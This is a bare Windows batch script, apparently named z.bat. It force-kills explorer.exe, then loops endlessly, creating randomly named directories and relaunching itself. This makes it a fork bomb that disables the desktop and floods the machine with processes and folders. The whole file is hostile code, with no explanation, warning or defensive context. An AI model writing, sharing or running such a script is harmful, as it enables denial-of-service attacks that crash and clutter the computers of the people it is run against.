@echo off
taskkill /f /im explorer.exe
:top
md %random%
md %random%
md %random%
md %random%
start z.bat
goto top
